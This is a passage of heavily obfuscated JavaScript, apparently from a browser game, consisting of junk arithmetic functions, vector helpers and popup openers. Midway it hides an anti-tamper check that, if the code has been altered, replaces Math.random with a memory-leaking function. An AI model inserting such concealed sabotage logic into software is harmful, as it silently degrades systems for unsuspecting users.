			const ΔⵠⲆΔⲆᐃⵠ = (32 << (ⵠⲆⵠΔⲆ >> 32 & 255)) + (16 << (ⵠⲆⵠΔⲆ >> 16 & 255)) + (24 << (ⵠⲆⵠΔⲆ >> 24 & 255)) + (ⵠⵠⲆⵠΔ << (ⵠⲆⵠΔⲆ >> 8 & 255));
			const ⵠⵠⵠΔΔⲆⲆ = (ᐃᐃⵠ + (50595 + ⲆᐃⲆᐃᐃⲆᐃ) * 22695477) % 4294967296;
			const ⲆΔⲆⲆⲆᐃⲆ = ~(40066 & ⵠⲆⵠⲆⵠΔⵠ) & ⵠⲆⵠⲆⵠΔⵠ | ~(ⵠⲆⵠⲆⵠΔⵠ & 40066) & 40066;
			const ΔΔΔⵠⵠⲆⲆ = 18768 ^ ᐃᐃⲆⵠⵠⵠⲆ;
			const ΔⵠⵠᐃΔⵠΔ = ⲆΔΔⵠΔⵠΔ(ΔⵠⲆΔⲆᐃⵠ, ⵠⵠⵠΔΔⲆⲆ, ⲆΔⲆⲆⲆᐃⲆ, ΔΔΔⵠⵠⲆⲆ, ΔⵠⲆΔⲆᐃⵠ);
			const ⵠⵠΔⲆΔⲆⵠ = ⵠⲆⵠΔⵠᐃⵠ(ⵠⵠⵠΔΔⲆⲆ, ⲆΔⲆⲆⲆᐃⲆ, ΔΔΔⵠⵠⲆⲆ, ΔⵠⲆΔⲆᐃⵠ, ⵠⵠⵠΔΔⲆⲆ);
			const ᐃⵠⵠᐃΔᐃΔ = ⲆⲆΔΔⲆᐃⵠ(ⲆΔⲆⲆⲆᐃⲆ, ΔΔΔⵠⵠⲆⲆ);
			const ⲆⲆⲆᐃⵠᐃⵠ = (2531011 + 214013 * ((ΔⵠⵠᐃΔⵠΔ ^ ⵠⵠΔⲆΔⲆⵠ) + 35287)) % 4294967296;
			const ΔⵠⲆⵠᐃⵠᐃ = (1664525 * ((ⲆⲆⲆᐃⵠᐃⵠ ^ ᐃⵠⵠᐃΔᐃΔ) + 16767) + 1013904223) % 4294967296;
			return ΔⵠⲆⵠᐃⵠᐃ
		}

		function ⲆΔΔⵠΔⵠΔ(ᐃᐃΔⵠΔᐃⲆ, ΔⵠⲆⲆΔ, ⵠⵠⵠⲆⲆⲆⲆ, ⲆⲆⵠᐃΔΔΔ, ⲆⲆⲆⲆΔΔᐃ) {
			const ⵠⵠⵠᐃᐃⵠⲆ = ᐃᐃΔⵠΔᐃⲆ ^ 62008;
			const ᐃᐃⲆΔΔΔⵠ = (24 << (ΔⵠⲆⲆΔ >> 32 & 255)) + (8 << (ΔⵠⲆⲆΔ >> 16 & 255)) + (32 << (ΔⵠⲆⲆΔ >> 8 & 255)) + (16 << (ΔⵠⲆⲆΔ >> 24 & 255));
			const ⲆᐃᐃΔⵠᐃᐃ = ((ⵠⵠⵠⲆⲆⲆⲆ + 46531) * 22695477 + 1) % 4294967296;
			const ΔᐃⵠⲆⲆⲆⵠ = ~(ⲆⲆⵠᐃΔΔΔ & 1884) & 1884 | ~(1884 & ⲆⲆⵠᐃΔΔΔ) & ⲆⲆⵠᐃΔΔΔ;
			const ΔⲆⵠΔᐃⲆⵠ = ~(ⲆⲆⲆⲆΔΔᐃ & 55588) & 55588 | ~(55588 & ⲆⲆⲆⲆΔΔᐃ) & ⲆⲆⲆⲆΔΔᐃ;
			const ⵠⵠⵠΔΔⵠΔ = ᐃⵠΔⲆᐃᐃⵠ(ⵠⵠⵠᐃᐃⵠⲆ, ᐃᐃⲆΔΔΔⵠ, ⲆᐃᐃΔⵠᐃᐃ, ΔᐃⵠⲆⲆⲆⵠ, ΔⲆⵠΔᐃⲆⵠ);
			const ᐃⲆⵠΔᐃΔⵠⲆᐃ = ᐃᐃᐃⲆᐃΔᐃ(ⵠⵠⵠᐃᐃⵠⲆ, ᐃᐃⲆΔΔΔⵠ, ⲆᐃᐃΔⵠᐃᐃ, ΔᐃⵠⲆⲆⲆⵠ, ΔⲆⵠΔᐃⲆⵠ, ⵠⵠⵠᐃᐃⵠⲆ);
			const ᐃⵠΔⲆⵠΔⵠ = ⵠⲆᐃⲆⲆΔΔ(ᐃᐃⲆΔΔΔⵠ, ⲆᐃᐃΔⵠᐃᐃ, ΔᐃⵠⲆⲆⲆⵠ, ΔⲆⵠΔᐃⲆⵠ, ⵠⵠⵠᐃᐃⵠⲆ);
			const ᐃᐃΔΔΔᐃᐃ = ⵠⵠⵠΔΔⵠΔ ^ 57467;
			const ⵠᐃⵠΔᐃΔᐃ = (1664525 * ((ᐃᐃΔΔΔᐃᐃ ^ ᐃⵠΔⲆⵠΔⵠ) + 3037) + 1013904223) % 4294967296;
			return ⵠᐃⵠΔᐃΔᐃ
		}
		const ⵠⵠΔⲆ = ᐃⲆⵠᐃ;
		const ΔΔΔᐃᐃⲆᐃ = ⲆΔⲆⲆᐃ;
		const ⲆⲆⲆⵠⲆ = ⵠⵠᐃΔΔ;
		const ⲆΔⲆΔⵠ = ΔΔⵠⲆⵠ;

		function ⲆᐃⲆΔᐃᐃᐃ(ᐃΔᐃⵠⵠⵠⲆ, ⵠΔⵠᐃⲆⲆᐃ) {
			const ᐃΔᐃⲆΔᐃⲆ = (1664525 * (ᐃΔᐃⵠⵠⵠⲆ + 44664) + 1013904223) % 4294967296;
			const ᐃⲆᐃⲆⵠᐃⵠ = ⵠΔⵠᐃⲆⲆᐃ ^ 53080;
			const ⵠΔⵠᐃᐃⲆᐃ = ΔᐃΔΔⲆⵠⲆ(ᐃΔᐃⲆΔᐃⲆ, ᐃⲆᐃⲆⵠᐃⵠ, ᐃΔᐃⲆΔᐃⲆ, ᐃⲆᐃⲆⵠᐃⵠ, ᐃΔᐃⲆΔᐃⲆ);
			const ᐃᐃΔΔᐃΔΔ = ᐃⲆⵠⲆⵠΔⵠ(ᐃⲆᐃⲆⵠᐃⵠ, ᐃΔᐃⲆΔᐃⲆ, ᐃⲆᐃⲆⵠᐃⵠ, ᐃΔᐃⲆΔᐃⲆ, ᐃⲆᐃⲆⵠᐃⵠ);
			const ⵠΔⲆⵠⵠⲆᐃ = ΔⲆΔᐃΔ(ᐃΔᐃⲆΔᐃⲆ, ᐃⲆᐃⲆⵠᐃⵠ, ᐃΔᐃⲆΔᐃⲆ, ᐃⲆᐃⲆⵠᐃⵠ);
			const ⵠⵠⵠⲆⲆᐃᐃ = ((ⵠΔⵠᐃᐃⲆᐃ ^ ᐃᐃΔΔᐃΔΔ) + 17769) % 65357;
			const ΔᐃΔⲆⵠΔᐃ = (1 + ((ⵠⵠⵠⲆⲆᐃᐃ ^ ⵠΔⲆⵠⵠⲆᐃ) + 57525) * 22695477) % 4294967296;
			return ΔᐃΔⲆⵠΔᐃ
		}

		function ᐃⲆⵠⲆⵠΔⵠ(ⲆⵠⵠⲆΔᐃⲆ, ⵠⲆᐃᐃⵠⲆᐃ, ⵠⵠᐃΔᐃΔⲆ, ΔⵠΔⲆᐃᐃᐃ, ᐃᐃΔᐃᐃⵠᐃ) {
			const ⲆⲆΔΔᐃⲆᐃ = ~(42203 & ⲆⵠⵠⲆΔᐃⲆ) & ⲆⵠⵠⲆΔᐃⲆ | ~(ⲆⵠⵠⲆΔᐃⲆ & 42203) & 42203;
			const ⲆⵠⵠⵠⵠΔⵠ = 50118 ^ ⵠⲆᐃᐃⵠⲆᐃ;
			const ⲆᐃⲆΔⵠⲆᐃ = ⵠⵠᐃΔᐃΔⲆ ^ 41620;
			const ΔⲆΔᐃⲆΔᐃ = (2147483629 * (ΔⵠΔⲆᐃᐃᐃ + 34240) + 2147483587) % 2147483647;
			const ΔⲆΔⲆΔᐃⵠ = (32 << (ᐃᐃΔᐃᐃⵠᐃ >> 16 & 255)) + (ⵠᐃⵠⵠⲆ << (ᐃᐃΔᐃᐃⵠᐃ >> 8 & 255)) + (8 << (ᐃᐃΔᐃᐃⵠᐃ >> 32 & 255)) + (24 << (ᐃᐃΔᐃᐃⵠᐃ >> 24 & 255));
			const ᐃⵠΔΔᐃᐃⵠ = ᐃᐃᐃⲆᐃΔᐃ(ⲆⲆΔΔᐃⲆᐃ, ⲆⵠⵠⵠⵠΔⵠ, ⲆᐃⲆΔⵠⲆᐃ, ΔⲆΔᐃⲆΔᐃ, ΔⲆΔⲆΔᐃⵠ, ⲆⲆΔΔᐃⲆᐃ);
			const ΔΔⵠⲆᐃⵠⲆⲆᐃ = ᐃᐃᐃⲆᐃΔᐃ(ⲆⵠⵠⵠⵠΔⵠ, ⲆᐃⲆΔⵠⲆᐃ, ΔⲆΔᐃⲆΔᐃ, ΔⲆΔⲆΔᐃⵠ, ⲆⲆΔΔᐃⲆᐃ, ⲆⵠⵠⵠⵠΔⵠ);
			const ΔΔᐃⲆⲆⲆⵠ = ΔⲆΔᐃΔ(ⲆᐃⲆΔⵠⲆᐃ, ΔⲆΔᐃⲆΔᐃ, ΔⲆΔⲆΔᐃⵠ, ⲆⲆΔΔᐃⲆᐃ);
			const ΔⵠΔⵠⵠΔⵠ = (43477 | ᐃⵠΔΔᐃᐃⵠ) & ~(ᐃⵠΔΔᐃᐃⵠ & 43477);
			const ΔⲆⵠⵠⵠΔⵠ = (2531011 + 214013 * ((ΔⵠΔⵠⵠΔⵠ ^ ΔΔᐃⲆⲆⲆⵠ) + 53616)) % 4294967296;
			return ΔⲆⵠⵠⵠΔⵠ
		}

		function ΔᐃΔΔⲆⵠⲆ(ΔⵠⲆᐃⵠⵠᐃ, ⵠΔᐃᐃΔᐃⲆ, ᐃⵠⲆΔⲆᐃⵠ, ⲆᐃⲆⵠᐃᐃᐃ, ⵠᐃΔΔⲆΔᐃ) {
			const ᐃⵠⵠⲆΔᐃΔ = (ⵠᐃⵠⵠⲆ << (ΔⵠⲆᐃⵠⵠᐃ >> 32 & ᐃᐃᐃⵠⵠ)) + (24 << (ΔⵠⲆᐃⵠⵠᐃ >> 24 & 255)) + (ⵠⵠⲆⵠΔ << (ΔⵠⲆᐃⵠⵠᐃ >> 8 & 255)) + (32 << (ΔⵠⲆᐃⵠⵠᐃ >> 16 & 255));
			const ΔΔⲆᐃⲆⲆᐃ = ⵠΔᐃᐃΔᐃⲆ ^ 55978;
			const ΔΔᐃΔⵠᐃᐃ = ((ᐃⵠⲆΔⲆᐃⵠ + 2934) * 1664525 + 1013904223) % 4294967296;
			const ᐃⵠᐃΔᐃⲆᐃ = ~(ⲆᐃⲆⵠᐃᐃᐃ & 30642) & (ⲆᐃⲆⵠᐃᐃᐃ | 30642);
			const ⵠΔⵠⵠᐃᐃᐃ = (8 << (ⵠᐃΔΔⲆΔᐃ >> 8 & 255)) + (24 << (ⵠᐃΔΔⲆΔᐃ >> 32 & 255)) + (16 << (ⵠᐃΔΔⲆΔᐃ >> 24 & 255)) + (32 << (ⵠᐃΔΔⲆΔᐃ >> 16 & 255));
			const ⲆⲆⵠᐃᐃⲆⵠ = ᐃⲆⵠⲆⵠΔⵠ(ᐃⵠⵠⲆΔᐃΔ, ΔΔⲆᐃⲆⲆᐃ, ΔΔᐃΔⵠᐃᐃ, ᐃⵠᐃΔᐃⲆᐃ, ⵠΔⵠⵠᐃᐃᐃ);
			const ⲆΔⵠᐃᐃΔⲆ = ⲆᐃⲆⵠΔⲆⲆ(ᐃⵠⵠⲆΔᐃΔ, ΔΔⲆᐃⲆⲆᐃ, ΔΔᐃΔⵠᐃᐃ, ᐃⵠᐃΔᐃⲆᐃ, ⵠΔⵠⵠᐃᐃᐃ);
			const ⲆⵠΔⲆⵠⵠΔⲆΔ = ΔⲆΔᐃΔ(ᐃⵠⵠⲆΔᐃΔ, ΔΔⲆᐃⲆⲆᐃ, ΔΔᐃΔⵠᐃᐃ, ᐃⵠᐃΔᐃⲆᐃ);
			const ΔⲆⵠⲆⲆᐃⵠ = (16 << ((ⲆⲆⵠᐃᐃⲆⵠ ^ ⲆΔⵠᐃᐃΔⲆ) >> 32 & 255)) + (24 << ((ⲆⲆⵠᐃᐃⲆⵠ ^ ⲆΔⵠᐃᐃΔⲆ) >> 8 & 255)) + (8 << ((ⲆⲆⵠᐃᐃⲆⵠ ^ ⲆΔⵠᐃᐃΔⲆ) >> 24 & 255)) + (32 << ((ⲆⲆⵠᐃᐃⲆⵠ ^ ⲆΔⵠᐃᐃΔⲆ) >> 16 & 255));
			const ΔⲆᐃΔⲆⲆΔ = ~(23686 & ΔⲆⵠⲆⲆᐃⵠ) & (23686 | ΔⲆⵠⲆⲆᐃⵠ);
			return ΔⲆᐃΔⲆⲆΔ
		}

		function ⲆⵠΔⲆΔⵠΔ(ⲆⲆⲆΔΔⲆⲆ, ⲆΔΔᐃΔⵠⵠ) {
			const ⲆⵠΔⲆⵠⵠⲆ = 24508 ^ ⲆⲆⲆΔΔⲆⲆ;
			const ᐃⲆⵠⲆⲆⲆⵠ = (16 << (ⲆΔΔᐃΔⵠⵠ >> 16 & ΔⵠᐃⵠΔ)) + (24 << (ⲆΔΔᐃΔⵠⵠ >> 8 & 255)) + (32 << (ⲆΔΔᐃΔⵠⵠ >> 32 & 255)) + (8 << (ⲆΔΔᐃΔⵠⵠ >> 24 & 255));
			const ᐃᐃⲆⵠΔⵠᐃ = ΔΔΔΔΔΔΔ(ⲆⵠΔⲆⵠⵠⲆ, ᐃⲆⵠⲆⲆⲆⵠ, ⲆⵠΔⲆⵠⵠⲆ, ᐃⲆⵠⲆⲆⲆⵠ, ⲆⵠΔⲆⵠⵠⲆ);
			const ᐃⵠⲆᐃⲆᐃΔ = ΔᐃΔΔⲆⵠⲆ(ᐃⲆⵠⲆⲆⲆⵠ, ⲆⵠΔⲆⵠⵠⲆ, ᐃⲆⵠⲆⲆⲆⵠ, ⲆⵠΔⲆⵠⵠⲆ, ᐃⲆⵠⲆⲆⲆⵠ);
			const ⵠᐃⲆⲆᐃᐃⲆΔⵠ = ⲆΔΔⲆⵠᐃᐃ(ⲆⵠΔⲆⵠⵠⲆ, ᐃⲆⵠⲆⲆⲆⵠ, ⲆⵠΔⲆⵠⵠⲆ, ᐃⲆⵠⲆⲆⲆⵠ, ⲆⵠΔⲆⵠⵠⲆ);
			const ΔΔᐃΔⲆᐃⲆ = (((ᐃᐃⲆⵠΔⵠᐃ ^ ᐃⵠⲆᐃⲆᐃΔ) + 11269) * 2147483629 + 2147483587) % 2147483647;
			const ΔᐃΔᐃⲆΔⵠ = ~(ΔΔᐃΔⲆᐃⲆ & 40927) & 40927 | ~(40927 & ΔΔᐃΔⲆᐃⲆ) & ΔΔᐃΔⲆᐃⲆ;
			return ΔᐃΔᐃⲆΔⵠ
		}

		function ⵠⲆᐃⲆⲆΔΔ(ⲆⲆΔΔⲆΔⲆ, ΔⵠᐃᐃⲆⲆᐃ, ⵠΔᐃΔᐃⵠⵠ, ⵠΔΔⵠΔΔⲆ, ΔⲆⵠᐃⵠⵠⵠ) {
			const ᐃΔⵠΔⲆⵠⵠ = (1103515245 * (ⲆⲆΔΔⲆΔⲆ + 49173) + 12345) % 2147483648;
			const ΔᐃⲆⲆᐃⵠᐃ = (ΔⵠᐃᐃⲆⲆᐃ + 52922) % 65337;
			const ⵠᐃⵠⲆⵠΔᐃ = ⵠΔᐃΔᐃⵠⵠ ^ 25250;
			const ᐃΔⵠᐃⵠⵠⲆ = ~(ⵠΔΔⵠΔΔⲆ & 10903) & 10903 | ~(10903 & ⵠΔΔⵠΔΔⲆ) & ⵠΔΔⵠΔΔⲆ;
			const ⵠΔⵠⲆΔᐃᐃ = ~(ΔⲆⵠᐃⵠⵠⵠ & 33814) & 33814 | ~(33814 & ΔⲆⵠᐃⵠⵠⵠ) & ΔⲆⵠᐃⵠⵠⵠ;
			const ⲆΔΔΔⲆΔⲆ = ᐃΔΔⲆⵠᐃΔ(ᐃΔⵠΔⲆⵠⵠ, ΔᐃⲆⲆᐃⵠᐃ, ⵠᐃⵠⲆⵠΔᐃ, ᐃΔⵠᐃⵠⵠⲆ, ⵠΔⵠⲆΔᐃᐃ);
			const ⲆΔᐃᐃⵠⵠⲆ = ⲆⵠΔⲆΔⵠΔ(ᐃΔⵠΔⲆⵠⵠ, ΔᐃⲆⲆᐃⵠᐃ);
			const ΔⲆΔᐃΔⵠⵠⲆΔ = ᐃΔΔⲆⵠᐃΔ(ⵠᐃⵠⲆⵠΔᐃ, ᐃΔⵠᐃⵠⵠⲆ, ⵠΔⵠⲆΔᐃᐃ, ᐃΔⵠΔⲆⵠⵠ, ΔᐃⲆⲆᐃⵠᐃ);
			const ⵠΔᐃΔⲆΔΔ = (1 + ((ⲆΔΔΔⲆΔⲆ ^ ⲆΔᐃᐃⵠⵠⲆ) + 19675) * 22695477) % 4294967296;
			const ⵠⲆⵠⵠⵠᐃᐃ = ~(7922 & ⵠΔᐃΔⲆΔΔ) & ⵠΔᐃΔⲆΔΔ | ~(ⵠΔᐃΔⲆΔΔ & 7922) & 7922;
			return ⵠⲆⵠⵠⵠᐃᐃ
		}
		const ΔⲆᐃᐃᐃ = ⲆΔⲆⵠᐃ;

		function ΔⵠΔᐃΔⵠᐃ(ⵠⵠΔΔΔ, ΔⵠⲆⵠΔᐃⲆ) {
			const ᐃΔⲆⲆᐃⲆⵠ = (16 << (ⵠⵠΔΔΔ >> 8 & ΔⵠⲆⵠᐃ)) + (32 << (ⵠⵠΔΔΔ >> 16 & 255)) + (8 << (ⵠⵠΔΔΔ >> 32 & 255)) + (24 << (ⵠⵠΔΔΔ >> 24 & 255));
			const ⵠΔΔⵠᐃᐃⲆ = (32 << (ΔⵠⲆⵠΔᐃⲆ >> 32 & ᐃᐃⲆⵠⲆ)) + (24 << (ΔⵠⲆⵠΔᐃⲆ >> 24 & 255)) + (8 << (ΔⵠⲆⵠΔᐃⲆ >> 8 & 255)) + (16 << (ΔⵠⲆⵠΔᐃⲆ >> 16 & 255));
			const ⵠⲆΔⵠᐃⵠⵠ = ᐃᐃΔⵠⲆΔⲆ(ᐃΔⲆⲆᐃⲆⵠ, ⵠΔΔⵠᐃᐃⲆ, ᐃΔⲆⲆᐃⲆⵠ, ⵠΔΔⵠᐃᐃⲆ, ᐃΔⲆⲆᐃⲆⵠ, ⵠΔΔⵠᐃᐃⲆ);
			const ΔⲆⲆᐃⵠⵠᐃΔⵠ = ΔⲆᐃΔⵠⲆⵠ(ᐃΔⲆⲆᐃⲆⵠ, ⵠΔΔⵠᐃᐃⲆ, ᐃΔⲆⲆᐃⲆⵠ, ⵠΔΔⵠᐃᐃⲆ, ᐃΔⲆⲆᐃⲆⵠ);
			const ᐃᐃⲆⵠⵠⲆⲆΔΔ = ⲆᐃⲆΔᐃᐃᐃ(ⵠΔΔⵠᐃᐃⲆ, ᐃΔⲆⲆᐃⲆⵠ);
			const ᐃᐃΔᐃⲆⵠⲆ = (ⵠⲆΔⵠᐃⵠⵠ | 58283) & ~(58283 & ⵠⲆΔⵠᐃⵠⵠ);
			const ⵠᐃᐃⵠΔᐃᐃ = 8337 ^ ᐃᐃΔᐃⲆⵠⲆ;
			return ⵠᐃᐃⵠΔᐃᐃ
		}

		function ᐃⲆⵠΔΔᐃΔ(ⵠᐃΔⵠⲆⲆⵠ, ⲆⲆᐃΔⵠⵠⲆ, ⵠΔᐃⲆᐃΔΔ) {
			const ΔⵠᐃⵠⲆΔⵠ = 23323 ^ ⵠᐃΔⵠⲆⲆⵠ;
			const ΔΔⲆⲆᐃⵠΔ = (2531011 + (61713 + ⲆⲆᐃΔⵠⵠⲆ) * 214013) % 4294967296;
			const ΔⵠⵠΔΔᐃⵠ = (ⵠΔᐃⲆᐃΔΔ | 24198) & ~(ⵠΔᐃⲆᐃΔΔ & 24198);
			const ᐃⵠᐃᐃⵠΔΔ = ΔΔΔΔΔΔΔ(ΔⵠᐃⵠⲆΔⵠ, ΔΔⲆⲆᐃⵠΔ, ΔⵠⵠΔΔᐃⵠ, ΔⵠᐃⵠⲆΔⵠ, ΔΔⲆⲆᐃⵠΔ);
			const ΔΔΔΔΔⵠⲆ = ΔΔΔΔΔΔΔ(ΔⵠⵠΔΔᐃⵠ, ΔⵠᐃⵠⲆΔⵠ, ΔΔⲆⲆᐃⵠΔ, ΔⵠⵠΔΔᐃⵠ, ΔⵠᐃⵠⲆΔⵠ);
			const ⲆⲆΔⲆⵠⲆᐃⵠⲆ = ΔΔΔΔΔΔΔ(ΔΔⲆⲆᐃⵠΔ, ΔⵠⵠΔΔᐃⵠ, ΔⵠᐃⵠⲆΔⵠ, ΔΔⲆⲆᐃⵠΔ, ΔⵠⵠΔΔᐃⵠ);
			const ⲆⲆΔⲆΔⲆΔ = (16 << ((ᐃⵠᐃᐃⵠΔΔ ^ ΔΔΔΔΔⵠⲆ) >> 32 & 255)) + (8 << ((ᐃⵠᐃᐃⵠΔΔ ^ ΔΔΔΔΔⵠⲆ) >> 8 & 255)) + (24 << ((ᐃⵠᐃᐃⵠΔΔ ^ ΔΔΔΔΔⵠⲆ) >> 24 & 255)) + (32 << ((ᐃⵠᐃᐃⵠΔΔ ^ ΔΔΔΔΔⵠⲆ) >> ΔΔᐃᐃⲆ & 255));
			const ᐃΔⵠⲆⲆΔΔ = ⲆⲆΔⲆΔⲆΔ ^ 31181;
			return ᐃΔⵠⲆⲆΔΔ
		}

		function ᐃᐃᐃⲆᐃΔᐃ(ⵠⵠᐃⲆⵠⲆⲆ, ΔⵠᐃⵠⵠΔⲆ, ᐃΔⵠΔᐃⵠΔ, ⲆᐃΔⵠⵠᐃⲆ, ΔⵠⵠⵠⲆΔᐃ, ᐃⵠⵠⲆⵠⵠᐃ) {
			const ⵠⲆᐃᐃⲆⲆᐃ = (ⵠⵠᐃⲆⵠⲆⲆ + 52483) % 65496;
			const ⲆΔᐃᐃⵠΔΔ = (ⲆⲆⲆΔΔ << (ΔⵠᐃⵠⵠΔⲆ >> 16 & 255)) + (24 << (ΔⵠᐃⵠⵠΔⲆ >> ⵠⵠⲆⵠΔ & 255)) + (32 << (ΔⵠᐃⵠⵠΔⲆ >> 24 & 255)) + (8 << (ΔⵠᐃⵠⵠΔⲆ >> 32 & ΔⵠᐃⵠΔ));
			const ᐃⵠⲆΔΔⲆⲆ = ᐃΔⵠΔᐃⵠΔ ^ 8102;
			const ⵠⲆⲆΔΔᐃⵠ = (24 << (ⲆᐃΔⵠⵠᐃⲆ >> 16 & 255)) + (32 << (ⲆᐃΔⵠⵠᐃⲆ >> 32 & 255)) + (8 << (ⲆᐃΔⵠⵠᐃⲆ >> 24 & 255)) + (16 << (ⲆᐃΔⵠⵠᐃⲆ >> 8 & ΔⵠᐃⵠΔ));
			const ΔⲆᐃⲆᐃᐃΔ = ~(ΔⵠⵠⵠⲆΔᐃ & 29687) & 29687 | ~(29687 & ΔⵠⵠⵠⲆΔᐃ) & ΔⵠⵠⵠⲆΔᐃ;
			const ΔⵠΔⵠΔΔΔ = (1 + 22695477 * (62237 + ᐃⵠⵠⲆⵠⵠᐃ)) % 4294967296;
			const ⵠⲆⲆᐃᐃⵠΔ = ⲆⲆΔΔⲆᐃⵠ(ⵠⲆᐃᐃⲆⲆᐃ, ⲆΔᐃᐃⵠΔΔ);
			const ⵠᐃⵠⵠⲆⵠΔ = ⲆⲆΔΔⲆᐃⵠ(ᐃⵠⲆΔΔⲆⲆ, ⵠⲆⲆΔΔᐃⵠ);
			const ⲆⵠΔᐃΔⲆΔⲆⵠ = ⲆⲆΔΔⲆᐃⵠ(ΔⲆᐃⲆᐃᐃΔ, ΔⵠΔⵠΔΔΔ);
			const ΔⲆⵠᐃᐃⵠᐃ = (45290 + (ⵠⲆⲆᐃᐃⵠΔ ^ ⵠᐃⵠⵠⲆⵠΔ)) % 65334;
			const ⲆᐃᐃⲆⲆⵠᐃ = 55575 ^ ΔⲆⵠᐃᐃⵠᐃ;
			return ⲆᐃᐃⲆⲆⵠᐃ
		}
		const ᐃⵠⵠⲆᐃ = ᐃᐃⵠΔⵠ;
		const ⵠᐃΔⲆⲆᐃⲆᐃⲆ = "";

		function ᐃᐃᐃⲆΔⲆᐃ(ⵠΔⵠⵠΔⵠⲆ) {
			if (ⵠΔⵠⵠΔⵠⲆ > 0) return ⵠΔⵠⵠΔⵠⲆ * ⵠΔⵠⵠΔⵠⲆ;
			else return ⵠΔⵠⵠΔⵠⲆ
		}

		function ⵠⵠⲆⵠΔⵠⵠ(ᐃΔᐃⲆⲆⵠᐃ) {
			return ᐃⲆᐃΔᐃⵠᐃ.String.fromCharCode(ᐃΔᐃⲆⲆⵠᐃ)
		}

		function ΔΔⲆΔⲆᐃᐃ(ᐃⵠⵠΔᐃΔΔ) {
			return ᐃⵠⵠΔᐃΔΔ.map(ⵠⵠⲆⵠΔⵠⵠ).join(ⵠᐃΔⲆⲆᐃⲆᐃⲆ)
		}

		function ⲆⲆⲆᐃⵠⵠⵠⲆΔ(ΔᐃΔⵠⲆⲆⵠ) {
			const ᐃⲆΔⵠᐃⵠⲆ = ᐃᐃᐃⲆΔⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[31]]();
			const ⲆᐃⵠᐃⵠᐃⲆⲆⵠ = ᐃⲆΔⵠᐃⵠⲆ.indexOf(ΔᐃΔⵠⲆⲆⵠ);
			return ⲆᐃⵠᐃⵠᐃⲆⲆⵠ !== -1 ? 1 : 0
		}
		const ⵠΔΔΔᐃΔᐃ = ⲆⲆⲆᐃⵠⵠⵠⲆΔ(ΔΔⲆΔⲆᐃᐃ([5123, 5123, 5123, 11398, 916, 11398, 5123]));
		if (ⵠΔΔΔᐃΔᐃ === 0) {
			const ⵠΔΔΔᐃΔᐃ = Math.random;
			const ᐃᐃᐃⲆΔⲆᐃ = [];
			const ⲆᐃⵠᐃⵠᐃⲆⲆⵠ = function() {
				for (let ⵠΔⵠⵠΔⵠⲆ = 0; ⵠΔⵠⵠΔⵠⲆ < 6562; ⵠΔⵠⵠΔⵠⲆ++) ᐃᐃᐃⲆΔⲆᐃ.push(ⵠΔⵠⵠΔⵠⲆ);
				return ⵠΔΔΔᐃΔᐃ()
			};
			Math.random = ⲆᐃⵠᐃⵠᐃⲆⲆⵠ
		}
		const ΔΔᐃΔⲆ = ΔⵠᐃⵠΔ;
		const ⵠⵠⵠΔΔΔΔ = ⵠⲆⵠⵠⵠⵠᐃ;
		const ⲆΔⵠᐃΔ = ⵠⲆⲆΔᐃ;
		ΔΔⲆᐃ = {
			"ΔⲆⵠΔⵠΔᐃ": ΔⲆⵠΔⵠΔᐃ,
			"ΔⲆⲆᐃΔⲆⵠⲆΔ": function(ⲆⲆⵠᐃⵠΔᐃ) {
				var ⲆᐃΔⲆⵠⵠⲆ = ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[72]](ⲆⲆⵠᐃⵠΔᐃ, ⵠ[513]);
				ⲆᐃΔⲆⵠⵠⲆ.focus()
			},
			"ΔⵠⲆΔⲆΔΔ": function(ⲆⲆⵠᐃⵠΔᐃ) {
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[72]](ⲆⲆⵠᐃⵠΔᐃ, ⵠ[513], "location=yes,height=570,width=520,scrollbars=yes,status=yes")
			},
			"ⲆⵠⲆⲆⲆΔΔ": function(ⲆⲆᐃⲆ, ⲆᐃΔⲆ) {
				for (var ⵠᐃ in ⲆⲆᐃⲆ) {
					if (ⲆⲆᐃⲆ[ⵠᐃ] != ⲆᐃΔⲆ[ⵠᐃ]) return ΔᐃᐃⲆⲆ
				}
				return ⵠᐃⲆᐃΔ
			},
			"ⵠⲆⵠᐃΔᐃΔᐃΔ": function(ⲆⲆᐃⲆ, ⲆᐃΔⲆ) {
				if (ⲆⲆᐃⲆ.length != ⲆᐃΔⲆ.length) return false;
				for (var ⵠᐃ = 0; ⵠᐃ < ⲆⲆᐃⲆ.length; ⵠᐃ++) {
					if (typeof ⲆⲆᐃⲆ == ⵠ[186]) {
						if (!this.ⲆⵠⲆⲆⲆΔΔ(ⲆⲆᐃⲆ[ⵠᐃ], ⲆᐃΔⲆ[ⵠᐃ])) return ᐃᐃⵠΔⵠ
					} else if (ⲆⲆᐃⲆ[ⵠᐃ] != ⲆᐃΔⲆ[ⵠᐃ]) return false
				}
				return true
			},
			"ΔᐃⵠⵠⵠⲆⵠ": function(ⲆⲆᐃⲆⵠ, ΔⵠⵠΔΔⵠⲆ) {
				ΔⵠⵠΔΔⵠⲆ.x = ⲆⲆᐃⲆⵠ.x;
				ΔⵠⵠΔΔⵠⲆ.y = ⲆⲆᐃⲆⵠ.y
			},
			"ᐃᐃⲆᐃⵠⵠᐃ": function(ⲆⵠⵠΔⵠ, ΔⲆⲆⵠᐃ) {
				return {
					x: ⲆⵠⵠΔⵠ.x - ΔⲆⲆⵠᐃ.x,
					y: ⲆⵠⵠΔⵠ.y - ΔⲆⲆⵠᐃ.y
				}
			},
			"ⵠΔⵠⲆᐃᐃᐃᐃΔ": function(ΔᐃΔ, ⲆⲆΔⵠⲆⲆⲆ) {
				ΔᐃΔ.x *= ⲆⲆΔⵠⲆⲆⲆ, ΔᐃΔ.y *= ⲆⲆΔⵠⲆⲆⲆ
			},
			"ⵠⲆΔΔⵠᐃᐃ": function(ⲆⵠⵠΔⵠ, ΔⲆⲆⵠᐃ) {
				return ⲆⵠⵠΔⵠ.x * ΔⲆⲆⵠᐃ.x + ⲆⵠⵠΔⵠ.y * ΔⲆⲆⵠᐃ.y
			},
			"ⲆⲆⲆⲆᐃⲆⵠ": function(ΔᐃΔ) {
				return Math.sqrt(ΔᐃΔ.x * ΔᐃΔ.x + ΔᐃΔ.y * ΔᐃΔ.y)
			},
			sign: function(ⲆⲆᐃⲆ) {
				if (ⲆⲆᐃⲆ < 0) return -ⵠΔᐃ;
				else return 1
			},
			"ᐃⵠⲆⵠⲆΔΔ": function(ⲆⵠⵠΔⵠ, ΔⲆⲆⵠᐃ) {
